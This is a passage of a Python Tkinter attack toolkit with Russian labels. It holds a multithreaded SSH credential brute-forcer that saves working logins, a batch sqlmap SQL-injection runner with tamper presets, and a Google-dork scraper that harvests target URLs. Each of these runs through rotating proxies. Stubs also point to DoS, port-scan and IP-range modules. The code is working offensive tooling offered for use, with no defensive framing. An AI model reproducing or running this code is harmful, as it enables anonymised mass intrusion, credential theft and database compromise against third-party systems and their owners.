            self.brute_status.config(text=f"Загружено: {len(self.brute_passwords)} паролей")

    def brute_worker(self):
        total = len(self.brute_targets) * len(self.brute_logins) * len(self.brute_passwords)
        checked = 0
        with ThreadPoolExecutor(max_workers=self.brute_threads.get()) as executor:
            for target in self.brute_targets:
                ip, port = target.split(":") if ":" in target else (target, "3389")
                for login in self.brute_logins:
                    for password in self.brute_passwords:
                        if not self.brute_running:
                            break
                        try:
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            ssh.connect(ip, port=int(port), username=login, password=password, timeout=self.timeout.get())
                            self.brute_results.append({"ip": ip, "port": port, "login": login, "password": password, "status": "Успех"})
                            self.brute_log.insert(tk.END, f"Успех: {ip}:{port} - {login}:{password}\n")
                            ssh.close()
                        except Exception as e:
                            self.brute_results.append({"ip": ip, "port": port, "login": login, "password": password, "status": f"Ошибка: {e}"})
                            self.brute_log.insert(tk.END, f"Ошибка: {ip}:{port} - {login}:{password} - {e}\n")
                        self.brute_log.see(tk.END)
                        self.brute_tree.delete(*self.brute_tree.get_children())
                        for result in self.brute_results:
                            self.brute_tree.insert("", "end", values=(
                                result["ip"], result["port"], result["login"], result["password"], result["status"]
                            ))
                        checked += 1
                        self.brute_progress["value"] = (checked / total * 100) if total else 0
                        self.brute_status.config(text=f"Проверено: {checked}/{total}")
                        self.root.update()
        self.stop_brute()

    def start_brute(self):
        if self.brute_running or not (self.brute_targets and self.brute_logins and self.brute_passwords):
            messagebox.showwarning("Ошибка", "Загрузите цели, логины и пароли")
            return
        self.brute_running = True
        self.brute_start_btn["state"] = "disabled"
        self.brute_stop_btn["state"] = "normal"
        self.brute_progress["value"] = 0
        self.brute_status.config(text="Брут начат...")
        threading.Thread(target=self.brute_worker, daemon=True).start()

    def stop_brute(self):
        self.brute_running = False
        self.brute_start_btn["state"] = "normal"
        self.brute_stop_btn["state"] = "disabled"
        self.brute_status.config(text="Остановлено")

    def save_brute_results(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt")
        if file_path:
            with open(file_path, "w") as f:
                for result in self.brute_results:
                    if result["status"] == "Успех":
                        f.write(f"{result['ip']}:{result['port']} - {result['login']}:{result['password']}\n")
            messagebox.showinfo("Успех", "Результаты сохранены")

    def clear_brute_results(self):
        self.brute_results.clear()
        self.brute_tree.delete(*self.brute_tree.get_children())
        self.brute_log.delete(1.0, tk.END)
        self.brute_status.config(text="Очищено")

    def get_tamper_scripts(self):
        tamper_dir = os.path.join(os.path.dirname(__file__), "sqlmap", "tamper")
        if os.path.exists(tamper_dir):
            return [f for f in os.listdir(tamper_dir) if f.endswith(".py") and f != "__init__.py"]
        return []

    def sqlmap_toggle_proxy_fields(self):
        state = "normal" if self.sqlmap_proxy_var_check.get() else "disabled"
        for widget in [
            self.sqlmap_proxy_types_listbox, self.sqlmap_proxy_type_combobox,
            self.sqlmap_proxy_file_entry, self.sqlmap_check_proxy_button, self.sqlmap_stop_proxy_button
        ]:
            widget.config(state=state)

    def sqlmap_update_proxy_types(self, event=None):
        selected_indices = self.sqlmap_proxy_types_listbox.curselection()
        self.sqlmap_selected_proxy_types = [self.sqlmap_proxy_types_listbox.get(i) for i in selected_indices]

    def sqlmap_load_proxy_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            self.sqlmap_proxy_file_entry.delete(0, tk.END)
            self.sqlmap_proxy_file_entry.insert(0, file_path)
            self.sqlmap_proxy_listbox.delete(0, tk.END)
            with open(file_path, "r") as f:
                self.sqlmap_proxy_list = [line.strip() for line in f if line.strip()]
                for proxy in self.sqlmap_proxy_list:
                    self.sqlmap_proxy_listbox.insert(tk.END, proxy)

    def sqlmap_check_proxies(self):
        if not self.sqlmap_proxy_list:
            messagebox.showwarning("Ошибка", "Загрузите список прокси")
            return
        self.proxy_check_running = True
        self.sqlmap_check_proxy_button.config(state="disabled")
        self.sqlmap_stop_proxy_button.config(state="normal")
        self.sqlmap_valid_proxies.clear()
        self.sqlmap_proxy_listbox.delete(0, tk.END)
        threading.Thread(target=self.sqlmap_proxy_checker_worker, daemon=True).start()

    def sqlmap_proxy_checker_worker(self):
        total = len(self.sqlmap_proxy_list)
        checked = 0
        with ThreadPoolExecutor(max_workers=self.threads_count.get()) as executor:
            for proxy, result in zip(self.sqlmap_proxy_list, executor.map(self.check_proxy, [{"address": p, "type": self.sqlmap_proxy_type_combobox.get().lower()} for p in self.sqlmap_proxy_list])):
                if not self.proxy_check_running:
                    break
                if result:
                    self.sqlmap_valid_proxies.append(proxy)
                    self.sqlmap_proxy_listbox.insert(tk.END, f"{proxy} - Валиден")
                else:
                    self.sqlmap_proxy_listbox.insert(tk.END, f"{proxy} - Невалиден")
                checked += 1
                self.sqlmap_proxy_progress["value"] = (checked / total * 100) if total else 0
                self.root.update()
        self.sqlmap_stop_proxy_check()

    def sqlmap_stop_proxy_check(self):
        self.proxy_check_running = False
        self.sqlmap_check_proxy_button.config(state="normal")
        self.sqlmap_stop_proxy_button.config(state="disabled")
        self.sqlmap_proxy_progress["value"] = 0

    def sqlmap_add_site(self):
        url = self.sqlmap_site_entry.get().strip()
        if url and url not in self.sqlmap_sites:
            self.sqlmap_sites.append(url)
            self.sqlmap_sites_listbox.insert(tk.END, url)
            self.sqlmap_site_entry.delete(0, tk.END)

    def sqlmap_load_sites_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, "r") as f:
                for line in f:
                    url = line.strip()
                    if url and url not in self.sqlmap_sites:
                        self.sqlmap_sites.append(url)
                        self.sqlmap_sites_listbox.insert(tk.END, url)

    def sqlmap_remove_site(self):
        try:
            index = self.sqlmap_sites_listbox.curselection()[0]
            self.sqlmap_sites_listbox.delete(index)
            self.sqlmap_sites.pop(index)
        except IndexError:
            pass

    def sqlmap_clear_sites_list(self):
        self.sqlmap_sites.clear()
        self.sqlmap_sites_listbox.delete(0, tk.END)

    def sqlmap_run_sqlmap_all(self):
        if not self.sqlmap_sites:
            messagebox.showwarning("Ошибка", "Добавьте сайты для проверки")
            return
        self.sqlmap_running = True
        self.sqlmap_stop_button.config(state="normal")
        threading.Thread(target=self.sqlmap_worker, daemon=True).start()

    def sqlmap_worker(self):
        total = len(self.sqlmap_sites)
        checked = 0
        for site in self.sqlmap_sites.copy():
            if not self.sqlmap_running:
                break
            proxy = random.choice(self.sqlmap_valid_proxies) if self.sqlmap_proxy_var_sqlmap.get() and self.sqlmap_valid_proxies else None
            cmd = ["python", "sqlmap/sqlmap.py", "-u", site, "--batch"]
            if proxy:
                cmd.extend(["--proxy", proxy])
            preset = self.sqlmap_presets.get(self.sqlmap_preset_var.get(), self.sqlmap_presets["Быстро"])
            cmd.extend([
                f"--level={preset['level']}",
                f"--risk={preset['risk']}",
                f"--technique={preset['techniques']}",
                f"--time-sec={preset['time_sec']}",
            ])
            if preset["tamper"]:
                cmd.extend(["--tamper", preset["tamper"]])
            if preset["union_cols"]:
                cmd.extend(["--union-cols", preset["union_cols"]])
            if preset["union_char"]:
                cmd.extend(["--union-char", preset["union_char"]])
            if preset["headers"]:
                cmd.extend(["--headers", preset["headers"]])
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            self.sqlmap_output_log.config(state="normal")
            self.sqlmap_output_log.insert(tk.END, f"[{site}]\n{stdout}\n")
            self.sqlmap_output_log.see(tk.END)
            self.sqlmap_output_log.config(state="disabled")
            if stderr:
                self.sqlmap_error_log.config(state="normal")
                self.sqlmap_error_log.insert(tk.END, f"[{site}]\n{stderr}\n")
                self.sqlmap_error_log.see(tk.END)
                self.sqlmap_error_log.config(state="disabled")
            if "vulnerable" in stdout.lower():
                self.sqlmap_vulnerable_urls.add(site)
            checked += 1
            self.sqlmap_progress_value.set((checked / total * 100) if total else 0)
            self.sqlmap_progress_label.set(f"{int(self.sqlmap_progress_value.get())}%")
            self.root.update()
        self.sqlmap_stop_sqlmap()

    def sqlmap_stop_sqlmap(self):
        self.sqlmap_running = False
        self.sqlmap_stop_button.config(state="disabled")
        self.sqlmap_progress_value.set(0)
        self.sqlmap_progress_label.set("0%")

    def sqlmap_clear_logs(self):
        self.sqlmap_output_log.config(state="normal")
        self.sqlmap_output_log.delete(1.0, tk.END)
        self.sqlmap_output_log.config(state="disabled")
        self.sqlmap_error_log.config(state="normal")
        self.sqlmap_error_log.delete(1.0, tk.END)
        self.sqlmap_error_log.config(state="disabled")

    def sqlmap_run_parser_scan(self):
        self.sqlmap_running = True
        threading.Thread(target=self.sqlmap_parser_worker, daemon=True).start()

    def sqlmap_parser_worker(self):
        keywords = self.sqlmap_dorks_keywords.get().split(",")
        country = self.sqlmap_dorks_country.get()
        proxies = self.sqlmap_valid_proxies if self.sqlmap_proxy_var_parser.get() else []
        total = len(keywords)
        checked = 0
        for keyword in keywords:
            if not self.sqlmap_running:
                break
            query = f"site:*.{country.lower()} {keyword}" if country != "Выберите страну" else keyword
            url = f"https://www.google.com/search?q={quote(query)}"
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            proxy = {"http": random.choice(proxies)} if proxies else None
            try:
                response = requests.get(url, headers=headers, proxies=proxy, timeout=self.timeout.get())
                soup = BeautifulSoup(response.text, "html.parser")
                for link in soup.find_all("a", href=True):
                    href = link["href"]
                    if href.startswith("/url?q="):
                        url = href.split("&")[0].replace("/url?q=", "")
                        if url not in self.sqlmap_vulnerable_urls:
                            self.sqlmap_parser_listbox.insert(tk.END, url)
                            self.sqlmap_vulnerable_urls.add(url)
                checked += 1
                self.sqlmap_parser_progress["value"] = (checked / total * 100) if total else 0
                self.root.update()
            except Exception as e:
                logging.error(f"Ошибка парсинга: {e}")
        self.sqlmap_running = False
        self.sqlmap_parser_progress["value"] = 0

    def sqlmap_clear_parser_list(self):
        self.sqlmap_vulnerable_urls.clear()
        self.sqlmap_parser_listbox.delete(0, tk.END)

    def sqlmap_generate_dorks(self):
        keywords = self.sqlmap_dorks_keywords.get().split(",")
        country = self.sqlmap_dorks_country.get()
        for keyword in keywords:
            dork = f"site:*.{country.lower()} {keyword}" if country != "Выберите страну" else keyword
            self.sqlmap_dorks_list.append({"dork": dork, "status": "Не проверен"})
            self.sqlmap_dorks_tree.insert("", "end", values=(dork, "Не проверен", ""))

    def sqlmap_clear_dorks(self):
        self.sqlmap_dorks_list.clear()
        self.sqlmap_dorks_tree.delete(*self.sqlmap_dorks_tree.get_children())

    def sqlmap_export_dorks(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt")
        if file_path:
            with open(file_path, "w") as f:
                for dork in self.sqlmap_dorks_list:
                    f.write(f"{dork['dork']}\n")
            messagebox.showinfo("Успех", "Дорки сохранены")

    def sqlmap_show_advanced_settings(self):
        advanced_window = tk.Toplevel(self.root)
        advanced_window.title("Дополнительные настройки SQLMap")
        advanced_window.geometry("400x400")
        advanced_window.configure(bg=BG_COLOR)
        fields = [
            ("Level (1-5):", ttk.Entry(advanced_window), "Уровень тестирования"),
            ("Risk (0-3):", ttk.Entry(advanced_window), "Уровень риска"),
            ("Techniques:", ttk.Entry(advanced_window), "Техники (B,E,U,S,T,Q)"),
            ("Time-sec:", ttk.Entry(advanced_window), "Задержка"),
            ("Union-cols:", ttk.Entry(advanced_window), "Диапазон столбцов"),
            ("Union-char:", ttk.Entry(advanced_window), "Символ UNION")
        ]
        for i, (label, widget, tip) in enumerate(fields):
            ttk.Label(advanced_window, text=label).grid(row=i, column=0, sticky="w", padx=5, pady=5)
            widget.grid(row=i, column=1, sticky="ew", padx=5, pady=5)
            Tooltip(widget, tip)
        advanced_window.columnconfigure(1, weight=1)

    def sqlmap_select_save_file(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".csv")
        if file_path:
            self.sqlmap_save_file_entry.delete(0, tk.END)
            self.sqlmap_save_file_entry.insert(0, file_path)

    def sqlmap_show_site_menu(self, event):
        context_menu = tk.Menu(self.root, tearoff=0, bg=BG_COLOR, fg=FG_COLOR)
        context_menu.add_command(label="Копировать", command=lambda: self.root.clipboard_append(self.sqlmap_sites_listbox.get(tk.ACTIVE)))
        context_menu.add_command(label="Удалить", command=self.sqlmap_remove_site)
        context_menu.post(event.x_root, event.y_root)

    def add_context_menu(self, widget):
        if isinstance(widget, list):
            for w in widget:
                w.bind("<Button-3>", lambda e: self.context_menu.post(e.x_root, e.y_root))
        else:
            widget.bind("<Button-3>", lambda e: self.context_menu.post(e.x_root, e.y_root))

    def update_dos_selected_proxies(self, event=None):
        pass  # Заглушка для метода выбора прокси в DoS

    def refresh_dos_proxies(self):
        self.dos_proxy_listbox.delete(0, tk.END)
        for proxy in self.working_proxies:
            if proxy["status"] == "Валиден":
                self.dos_proxy_listbox.insert(tk.END, f"{proxy['type'].lower()}://{proxy['address']}")

    def update_port_scan_selected_proxies(self, event=None):
        pass  # Заглушка для метода выбора прокси в Port Scan

    def refresh_port_scan_proxies(self):
        self.port_scan_proxy_listbox.delete(0, tk.END)
        for proxy in self.working_proxies:
            if proxy["status"] == "Валиден":
                self.port_scan_proxy_listbox.insert(tk.END, f"{proxy['type'].lower()}://{proxy['address']}")

    def update_ip_range_selected_proxies(self, event=None):
        pass  # Заглушка для метода выбора прокси в IP Range

    def refresh_ip_range_proxies(self):
        self.ip_range_proxy_listbox.delete(0, tk.END)
        for proxy in self.working_proxies:
            if proxy["status"] == "Валиден":
                self.ip_range_proxy_listbox.insert(tk.END, f"{proxy['type'].lower()}://{proxy['address']}")

if __name__ == "__main__":
    root = tk.Tk()
    app = ProxyScraperApp(root)
    root.mainloop()
